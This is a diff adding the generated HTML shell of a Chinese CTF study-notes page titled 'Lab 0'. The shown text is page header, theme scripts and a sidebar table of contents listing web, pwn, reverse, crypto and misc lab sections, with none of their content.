@@ -1,0 +1,3373 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="久诚的 CTF 学习笔记">
+      
+      
+        <meta name="author" content="Jiucheng">
+      
+      
+        <link rel="canonical" href="https://jiuchengovo.github.io/study/ctf/Crypto%20Lab%200/">
+      
+      
+        <link rel="prev" href="../">
+      
+      
+        <link rel="next" href="../Crypto%20Lab%201/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../theme/assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Lab 0 - Jiucheng's CTF Note</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+    
+    
+      <link rel="stylesheet" href="../../../theme/css/variables.css">
+    
+      <link rel="stylesheet" href="../../../theme/css/main.css">
+    
+      <link rel="stylesheet" href="../../../theme/css/components.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+  <link rel="preload" as="style" href="/theme/css/github.min.css">
+  <link rel="preload" as="style" href="/theme/css/github-dark.min.css">
+  <script>
+    (function () {
+      try {
+        var saved = (typeof __md_get === "function") ? __md_get("__palette") : null;
+        var scheme;
+        if (saved && saved.color && saved.color.scheme) {
+          // 尊重用户已保存的选择
+          scheme = saved.color.scheme;
+        } else {
+          // 站点默认深色
+          scheme = "slate";
+        }
+        document.documentElement.setAttribute("data-md-color-scheme", scheme);
+        var hljsTheme = document.createElement("link");
+        hljsTheme.id = "hljs-theme";
+        hljsTheme.rel = "stylesheet";
+        hljsTheme.href = scheme === "slate"
+          ? "/theme/css/github-dark.min.css"
+          : "/theme/css/github.min.css";
+        document.head.appendChild(hljsTheme);
+        var attach = function () {
+          document.body.setAttribute("data-md-color-scheme", scheme);
+          new MutationObserver(function () {
+            var s = document.body.getAttribute("data-md-color-scheme");
+            if (s) document.documentElement.setAttribute("data-md-color-scheme", s);
+          }).observe(document.body, {
+            attributes: true,
+            attributeFilter: ["data-md-color-scheme"],
+          });
+        };
+        if (document.body) {
+          attach();
+        } else {
+          new MutationObserver(function (_, obs) {
+            if (document.body) {
+              attach();
+              obs.disconnect();
+            }
+          }).observe(document.documentElement, { childList: true });
+        }
+      } catch (e) {}
+    })();
+  </script>
+
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lab-0" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="Jiucheng&#39;s CTF Note" class="md-header__button md-logo" aria-label="Jiucheng's CTF Note" data-md-component="logo">
+      <!-- Jiucheng 字体图标 Logo -->
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 48" class="bf-logo" role="img" aria-label="Jiucheng">
+  <text x="0" y="36" class="bf-logo__text">Jiucheng</text>
+</svg>
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Jiucheng's CTF Note
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Lab 0
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换至浅色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换至浅色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换至深色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换至深色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Jiuchengovo/Jiuchengovo.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Jiuchengovo.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  学习
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../tools/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  工具
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../diaries/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  随笔
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Jiucheng&#39;s CTF Note" class="md-nav__button md-logo" aria-label="Jiucheng's CTF Note" data-md-component="logo">
+      <!-- Jiucheng 字体图标 Logo -->
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 48" class="bf-logo" role="img" aria-label="Jiucheng">
+  <text x="0" y="36" class="bf-logo__text">Jiucheng</text>
+</svg>
+    </a>
+    Jiucheng's CTF Note
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Jiuchengovo/Jiuchengovo.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Jiuchengovo.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    学习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    学习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF 夺旗赛
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CTF 夺旗赛
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab 0
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab 0
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prerequisite
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisite">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11-linux-基础命令" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.1 Linux 基础命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12-代码解读--pwn-初探" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1.2 代码解读 &amp; PWN 初探
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#challenge-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenge 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#我的尝试" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        我的尝试
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 2
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Challenge 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#前置知识sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        前置知识：SQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#我的尝试布尔盲注脚本" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        我的尝试：布尔盲注脚本
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pwn-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pwn Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pwn Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#漏洞分析" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#修复版" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修复版
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reverse-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reverse Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reverse Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#实验环境" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验环境
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#前置知识" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        前置知识
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#我的尝试_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        我的尝试
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="我的尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#分析代码" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ghidra-分析" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ghidra 分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#逆向-verify-函数" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逆向 verify 函数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#密码还原" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        密码还原
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#crypto-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Crypto Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#crypto-hack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Crypto Hack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Crypto Hack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#question-1-greatest-common-divisor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 1: Greatest Common Divisor
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2-extended-gcd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 2: Extended GCD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-3--4-modular-arithmetic" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 3 &amp; 4: Modular Arithmetic
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-5-modular-inverting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Question 5: Modular Inverting
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rsa-算法" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RSA 算法
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RSA 算法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-公钥与私钥的产生" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 公钥与私钥的产生
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-加密消息" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 加密消息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-解密消息" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 解密消息
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-解码原理与证明" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 解码原理与证明
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rsa-代码实现" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RSA 代码实现
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-0-rsa-题目解答" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab 0 RSA 题目解答
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc-lab-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Misc Lab 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc Lab 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#base-系列编码" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Base 系列编码
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Base 系列编码">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#什么是-base-系列编码" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        什么是 Base 系列编码？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#核心分类" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        核心分类
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#核心原理以-base64-为例" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        核心原理（以 Base64 为例）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#challenge-1-解题" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 1 解题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lsb-隐写--文件附加隐写" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LSB 隐写 &amp; 文件附加隐写
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="LSB 隐写 &amp; 文件附加隐写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#challenge-2-解题" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Challenge 2 解题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lsb-隐写原理" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LSB 隐写原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#文件附加隐写" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        文件附加隐写
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="文件附加隐写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#常见文件头尾" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常见文件头/尾
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#提取方法" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        提取方法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab 1
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Lab 1
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Crypto%20Lab%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crypto
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
